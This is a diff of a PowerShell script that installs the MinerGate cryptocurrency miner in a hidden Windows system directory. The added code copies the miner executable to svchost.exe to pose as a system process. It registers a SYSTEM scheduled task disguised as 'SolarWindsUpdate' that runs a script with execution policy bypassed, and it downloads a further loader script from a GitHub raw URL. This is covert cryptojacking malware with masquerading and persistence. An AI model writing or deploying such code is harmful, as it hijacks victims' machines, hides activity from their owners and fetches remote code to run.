@@ -1,14 +1,43 @@
-# Download
-$url2 = "https://minergate.com/download/win"
-$output2 = "C:\Windows\System32\drivers\en-US\MG.zip"
-Import-Module BitsTransfer
-Start-BitsTransfer -Source $url2 -Destination $output2
+# Download MinerGate CLI
+$url = "https://minergate.com/download/win-cli"
+$output = "C:\Windows\System32\drivers\en-US\MG.zip"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
 
-#Extract
+
+# Extract zip file
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 function Unzip
 {
     param([string]$zipfile, [string]$outpath)
+
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
-Unzip $output2
+Unzip "C:\Windows\System32\drivers\en-US\MG.zip" "C:\Windows\System32\drivers\en-US\"
+
+
+# Change Directory
+CD C:\Windows\System32\drivers\en-US\
+
+# Rename extracted folder
+$oldpath = Get-ChildItem | ?{ $_.PSIsContainer }
+Rename-Item $oldpath.name etc
+
+
+# Remove zip
+Remove-Item MG.zip
+
+
+# Rename exe
+Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\System32\drivers\en-US\etc\svchost.exe
+
+
+# Create scheduled Start Task
+SCHTASKS /Create /RU "SYSTEM" /tn SolarWindsUpdate /sc Weekly /d MON,TUE,WED,THU,FRI,SAT,SUN /st 18:00:00 /du 12:30 /k /ri 10 /tr "powershell.exe -ExecutionPolicy Bypass C:\Windows\System32\drivers\en-US\etc\MinerGateRun.ps1"
+
+
+# Download Loader
+$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Line.ps1"
+$output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
+Import-Module BitsTransfer
+Start-BitsTransfer -Source $url2 -Destination $output2
